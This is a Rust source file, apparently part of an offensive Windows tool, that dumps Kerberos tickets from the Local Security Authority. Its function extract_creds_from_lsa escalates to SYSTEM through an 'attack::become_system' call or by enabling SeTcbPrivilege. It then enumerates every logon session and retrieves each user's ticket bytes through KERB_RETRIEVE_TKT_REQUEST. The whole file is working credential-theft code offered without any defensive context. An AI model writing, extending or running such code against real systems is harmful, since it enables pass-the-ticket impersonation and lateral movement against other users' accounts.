use crate::error::Result;
use crate::windows::attack;
use crate::windows::error::{
    WINERROR_FILE_NOT_FOUND, WINERROR_NO_SUCH_LOGON_SESSION,
};
use crate::windows::lsa;
pub use crate::windows::lsa::{LsaLogonSessionData, TicketCacheInfoEx2};
use crate::windows::token::get_current_luid;
use crate::windows::token::{self, PrivilegeState};
use log;
use windows::Win32::Foundation::HANDLE;
use windows::Win32::Foundation::LUID;

pub struct LsaTicketSession {
    pub session_data: Option<LsaLogonSessionData>,
    pub tickets: Vec<LsaTicketWithMeta>,
}

pub struct LsaTicketWithMeta {
    pub meta: TicketCacheInfoEx2,
    pub ticket: Option<Vec<u8>>,
}

pub fn extract_creds_from_lsa(
    extract_tickets: bool,
    all_sessions: bool,
) -> Result<Vec<LsaTicketSession>> {
    let lsa_handle = connect_to_lsa(all_sessions)?;

    let result = extract_tickets_from_lsa_inner(
        lsa_handle,
        extract_tickets,
        all_sessions,
    );

    lsa::lsa_deregister_logon_process(lsa_handle);

    return result;
}

fn connect_to_lsa(all_sessions: bool) -> Result<HANDLE> {
    if all_sessions {
        acquire_setcbprivilege()?;
    }

    let lsa_handle = lsa::lsa_connect_untrusted();

    if all_sessions {
        token::revert_to_self();
    }

    return Ok(lsa_handle);
}

fn acquire_setcbprivilege() -> Result<()> {
    let privs = token::get_current_privileges();

    match token::get_privilege_state(&privs, "SeTcbPrivilege") {
        PrivilegeState::NotGranted => {
            log::debug!("Becoming system...");
            attack::become_system()?;
        }
        PrivilegeState::Disabled => {
            log::debug!("Enabling SeTcbPrivilege...");
            token::enable_privilege("SeTcbPrivilege")?;
        }
        PrivilegeState::Enabled => {}
    }

    return Ok(());
}

fn extract_tickets_from_lsa_inner(
    lsa_handle: lsa::HANDLE,
    extract_tickets: bool,
    all_sessions: bool,
) -> Result<Vec<LsaTicketSession>> {
    let auth_pack = lsa::lookup_kerberos_authentication_package(lsa_handle)?;

    let mut sessions_tickets = Vec::new();
    for session_luid in enum_session_luids(all_sessions) {
        let get_logon_luid = if session_luid == LUID::default() {
            get_current_luid()
        } else {
            session_luid
        };
        let session_data = match lsa::lsa_get_logon_session_data(get_logon_luid)
        {
            Ok(sd) => Some(sd),
            Err(e) => {
                // This unlikely situation can happen when we use a user
                // that is not admin (but has SeTcbPrivilege or can to become system)
                // , since only admins can retrieve session data for other users.
                // Anyway it is not crucial, so we just ignore it.
                log::debug!("Error getting session data: {}", e);
                None
            }
        };

        let metas = match lsa::get_tickets_info(lsa_handle, auth_pack, session_luid) {
            Ok(m) => m,
            Err(e) => if e.error == WINERROR_NO_SUCH_LOGON_SESSION {
                continue;
            } else {
                return Err(e)?
            }
        };

        let mut creds = Vec::new();

        for meta in metas.into_iter() {
            let ticket = if extract_tickets {
                match lsa::query_ticket_cred(
                    lsa_handle,
                    auth_pack,
                    session_luid,
                    &meta.server_name,
                    meta.ticket_flags,
                    meta.encryption_type,
                ) {
                    Ok(t) => Some(t),
                    Err(e) => if e.error == WINERROR_FILE_NOT_FOUND && e.source == "LsaCallAuthenticationPackage:KERB_RETRIEVE_TKT_REQUEST:Protocol status" {
                        // There is a problem to retrieve tgts with forwarded. I don't think this is super important, so we just skip it
                        None
                    } else {
                        return Err(e)?;
                    }
                }
            } else {
                None
            };
            creds.push(LsaTicketWithMeta { meta, ticket });
        }
        sessions_tickets.push(LsaTicketSession {
            session_data,
            tickets: creds,
        });
    }

    return Ok(sessions_tickets);
}

fn enum_session_luids(all_sessions: bool) -> Vec<LUID> {
    if all_sessions {
        return lsa::lsa_enumerate_logon_sessions().unwrap();
    }

    return vec![LUID::default()];
}
